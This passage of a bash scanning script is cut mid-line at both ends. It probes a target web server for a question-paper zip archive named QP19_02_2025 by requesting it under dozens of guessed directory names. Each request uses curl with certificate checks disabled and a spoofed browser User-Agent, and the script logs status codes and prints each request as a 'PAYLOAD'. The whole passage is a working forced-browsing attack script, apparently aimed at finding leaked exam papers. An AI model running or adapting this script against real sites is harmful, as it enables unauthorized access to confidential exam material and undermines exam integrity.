" "${target}Management-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
